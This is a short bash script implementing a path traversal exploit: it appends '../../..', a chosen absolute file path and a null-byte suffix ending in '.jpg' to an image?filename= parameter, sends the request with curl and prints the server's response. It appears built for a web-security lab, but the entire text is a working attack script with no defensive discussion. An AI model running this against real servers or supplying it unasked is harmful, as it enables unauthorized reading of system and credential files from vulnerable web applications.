#!/bin/bash

send_request() {
    local url=$1
    local file=$2
    full_url="${url}image?filename=../../..${file}%0048.jpg"
    echo "Sending request to: $full_url"
    response=$(curl "$full_url")
    echo "Response: $response"
}

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: $0 <url> <fileAbsolutePath>"
    exit 1
fi

url=$1
file=$2

send_request "$url" "$file"
